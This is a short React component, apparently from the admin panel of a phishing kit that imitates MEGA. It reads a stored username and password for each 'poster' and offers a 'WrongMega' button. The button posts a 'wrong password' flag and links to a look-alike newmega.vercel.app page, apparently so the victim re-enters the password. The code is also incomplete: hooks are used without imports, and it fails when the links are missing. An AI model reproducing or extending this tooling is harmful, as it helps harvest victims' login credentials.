import React from "react";
import { API_URL } from "../config/index";

function WrongMega({ id }) {
  console.log(id);
  const { query } = useRouter();
  const { posterDetailsId } = query;
  const { data, isLoading } = useGetData(`/posters/details/${posterDetailsId}`);

  const { _doc, details } = data ? data?.data?.data : "";

  const { username, password, links } = _doc ? _doc : "";

  console.log("LINE AT 14", links);
  const parts = links && new URL(links[0]).pathname.split("/").filter(Boolean);

  // Assign values
  const adminId = parts[0]; // "987"
  const posterId = parts[1]; // "vht"

  console.log("adminId:", adminId);
  console.log("posterId:", posterId);

  const handleWrongPass = async () => {
    const values = {
      id,
    };
    const url = `${API_URL}/password/mega/wrong`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    if (res.ok) {
      console.log("success", data);
    } else {
      console.log("error", data);
    }
  };

  return (
    <button
      onClick={handleWrongPass}
      className="bg-red-600 text-xs text-white font-semibold px-2 py-1 rounded"
    >
      <a href={`https://newmega.vercel.app/${adminId}/${posterId}?wrong=mega`}>
        WrongMega
      </a>
    </button>
  );
}

export default WrongMega;
